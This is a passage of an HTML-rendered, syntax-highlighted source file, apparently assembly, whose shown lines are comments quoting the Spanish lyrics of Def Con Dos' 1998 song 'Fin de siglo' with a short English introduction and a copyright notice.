</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If you know spanish, and you are as i am, you'll understand and feel</span><span class="sc0">
</span><span class="sc1">; identified with the following lyrics. It speaks about how the people change</span><span class="sc0">
</span><span class="sc1">; (becoming worse) because the system. It's from Def Con Dos' last album</span><span class="sc0">
</span><span class="sc1">; called 'DE POCA MADRE'. Enjoy!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Fin de siglo</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; No se si a ti te ata¤e</span><span class="sc0">
</span><span class="sc1">; no se si a ti te extra¤a</span><span class="sc0">
</span><span class="sc1">; pero noto a mis amigos algo raro en sus miradas</span><span class="sc0">
</span><span class="sc1">; no me reconocen, ya no me saludan</span><span class="sc0">
</span><span class="sc1">; y ahora todos llevan traje azul en vez de chupa</span><span class="sc0">
</span><span class="sc1">; Ya no beben en la calle</span><span class="sc0">
</span><span class="sc1">; ya no paran en los bares</span><span class="sc0">
</span><span class="sc1">; ya no mean en las esquinas</span><span class="sc0">
</span><span class="sc1">; ni vomitan en los portales</span><span class="sc0">
</span><span class="sc1">; Ahora madrugan, se han vuelto gente seria</span><span class="sc0">
</span><span class="sc1">; que ahorra para la vejez y vota a la derecha</span><span class="sc0">
</span><span class="sc1">; No se que pasa cuando quiero hablar con mis amigos</span><span class="sc0">
</span><span class="sc1">; no cogen el telefono o me dicen que se han ido</span><span class="sc0">
</span><span class="sc1">; no consigo dar con ellos para ir juntos a montarla</span><span class="sc0">
</span><span class="sc1">; y siempre acabo solo apoyando codo en barra</span><span class="sc0">
</span><span class="sc1">; Algo huele raro, algo no me han dicho</span><span class="sc0">
</span><span class="sc1">; y empiezo a sospechar que han sido abducidos</span><span class="sc0">
</span><span class="sc1">; La abduccion es un problema de todos</span><span class="sc0">
</span><span class="sc1">; por favor no me dejeis ­NO! no me dejeis solo</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO rodeado de abducidos</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO solo y sin amigos</span><span class="sc0">
</span><span class="sc1">; Vaya fin de siglo mas jodido</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO rodeado de abducidos</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO solo y sin amigos</span><span class="sc0">
</span><span class="sc1">; Vaya fin de siglo mas jodido</span><span class="sc0">
</span><span class="sc1">; No se si a ti te ata¤e</span><span class="sc0">
</span><span class="sc1">; no se si a ti te extra¤a</span><span class="sc0">
</span><span class="sc1">; pero replicas de mis amigos han salido de unas vainas</span><span class="sc0">
</span><span class="sc1">; son iguales que ellos, tienen su misma cara, pero se que</span><span class="sc0">
</span><span class="sc1">; no son ellos cuando observo sus miradas</span><span class="sc0">
</span><span class="sc1">; Todos se han cortado las gre¤as</span><span class="sc0">
</span><span class="sc1">; todos han sentado la cabeza</span><span class="sc0">
</span><span class="sc1">; y lo que antes odiaban, ahora se celebra</span><span class="sc0">
</span><span class="sc1">; Ya no fuman PETAS, solo van de farla</span><span class="sc0">
</span><span class="sc1">; y visten polo azul con la bandera patria</span><span class="sc0">
</span><span class="sc1">; Todos felices, todos con el movil</span><span class="sc0">
</span><span class="sc1">; hablan entre ellos, son un nuevo orden</span><span class="sc0">
</span><span class="sc1">; La abduccion es un problema de todos</span><span class="sc0">
</span><span class="sc1">; por favor no me dejeis ­NO! no me dejeis solo</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO rodeado de abducidos</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO solo y sin amigos</span><span class="sc0">
</span><span class="sc1">; Vaya fin de siglo mas jodido</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO rodeado de abducidos</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO</span><span class="sc0">
</span><span class="sc1">; FIN DE SIGLO solo y sin amigos</span><span class="sc0">
</span><span class="sc1">; Vaya fin de siglo mas jodido</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1998 Def Con Dos; "De Poca Madre" album.</span><span class="sc0">



</span></div></body>
</html>
